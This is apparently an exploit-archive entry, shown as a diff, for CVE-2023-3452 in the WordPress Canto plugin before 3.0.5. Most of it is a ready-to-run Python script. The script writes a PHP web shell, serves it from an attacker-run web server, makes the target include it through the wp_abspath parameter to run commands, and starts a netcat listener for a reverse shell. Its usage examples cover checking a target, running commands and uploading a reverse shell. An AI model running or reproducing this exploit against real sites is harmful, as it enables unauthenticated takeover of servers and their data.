@@ -1,0 +1,113 @@
+id: 39376
+date: 02/27/2024
+title: Wordpress Canto Plugin < 3.0.5 - Remote File Inclusion and Remote Code Execution Exploit
+author: Leopoldo Angulo
+cves: 
+
+# Exploit Title: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
+# Exploit Author: Leopoldo Angulo (leoanggal1)
+# Vendor Homepage: https://wordpress.org/plugins/canto/
+# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip
+# Version: All versions of Canto Plugin prior to 3.0.5
+# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4
+# CVE : CVE-2023-3452
+
+#PoC Notes:
+#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)
+#This code exploits the improper handling of the wp_abspath variable in the following line of the "download.php" code:
+#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...
+#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.
+# More information in Leoanggal1's Github
+
+#!/usr/bin/python3
+import argparse
+import http.server
+import socketserver
+import threading
+import requests
+import os
+import subprocess
+
+# Define the default web shell
+default_web_shell = "<?php system($_GET['cmd']); ?>"
+
+def create_admin_file(local_dir, local_shell=None):
+    if not os.path.exists(local_dir):
+        os.makedirs(local_dir)
+
+    # If a local shell is provided, use it; otherwise, use the default web shell
+    if local_shell:
+        with open(f"{local_dir}/admin.php", "wb") as admin_file:
+            with open(local_shell, "rb") as original_file:
+                admin_file.write(original_file.read())
+    else:
+        with open(f"{local_dir}/admin.php", "w") as admin_file:
+            admin_file.write(default_web_shell)
+
+def start_local_server(local_port):
+    Handler = http.server.SimpleHTTPRequestHandler
+    httpd = socketserver.TCPServer(("0.0.0.0", local_port), Handler)
+
+    print(f"Local web server on port {local_port}...")
+    httpd.serve_forever()
+
+    return httpd
+
+def exploit_rfi(url, local_shell, local_host, local_port, command, nc_port):
+    local_dir = "wp-admin"
+    create_admin_file(local_dir, local_shell)
+
+    target_url = f"{url}/wp-content/plugins/canto/includes/lib/download.php"
+    local_server = f"http://{local_host}:{local_port}"
+    command = f"cmd={command}"
+
+    if local_shell:
+        # If a local shell is provided, start netcat on the specified port
+        subprocess.Popen(["nc", "-lvp", str(nc_port)])
+
+    server_thread = threading.Thread(target=start_local_server, args=(local_port,))
+    server_thread.daemon = True
+    server_thread.start()
+
+    exploit_url = f"{target_url}?wp_abspath={local_server}&{command}"
+    print(f"Exploitation URL: {exploit_url}")
+
+    response = requests.get(exploit_url)
+    print("Server response:")
+    print(response.text)
+
+    # Shutdown the local web server
+    print("Shutting down local web server...")
+    server_thread.join()
+
+if __name__ == "__main__":
+    examples = '''
+    Examples:
+    - Check the vulnerability
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33
+
+    - Execute a command
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'
+
+    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
+    '''
+    parser = argparse.ArgumentParser(description="Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument("-u", "--url", required=True, default=None,  help="Vulnerable URL")
+    parser.add_argument("-s", "--shell", help="Local file for web shell")
+    parser.add_argument("-LHOST", "--local_host", required=True, help="Local web server IP")
+    parser.add_argument("-LPORT", "--local_port", help="Local web server port")
+    parser.add_argument("-c", "--command", default="whoami", help="Command to execute on the target")
+    parser.add_argument("-NC_PORT", "--nc_port", type=int, help="Listener port for netcat")
+
+    try:
+        args = parser.parse_args()
+
+        if args.local_port is None:
+            args.local_port = 8080  # Valor predeterminado si LPORT no se proporciona
+        exploit_rfi(args.url, args.shell, args.local_host, int(args.local_port), args.command, args.nc_port)
+
+    except SystemExit:
+        parser.print_help()
+
+#  0day.today [2024-02-28]  #
